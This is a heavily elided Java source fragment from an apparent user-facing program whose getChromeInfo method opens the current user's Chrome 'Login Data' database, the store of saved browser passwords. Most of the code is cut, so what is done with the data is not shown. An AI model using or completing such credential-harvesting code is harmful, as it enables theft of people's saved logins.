...
public class SQLiteJDBC
{
	...
	public static void intro() throws InterruptedException, IOException{
		...
		String s="\r\n" +
				 ...
				 "\r\n" +
				 "    In the event of an error, please send error info over\r\n" +
				 "    on to \"pbell722@gmail.com\", it really helps!\r\n" +
				 "\r\n" +
				 "    Press f to continue.\r\n";
	...
	public static ArrayList<String>getChromeInfo(){
		...
		try {
			...
			c = DriverManager.getConnection("jdbc:sqlite:C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
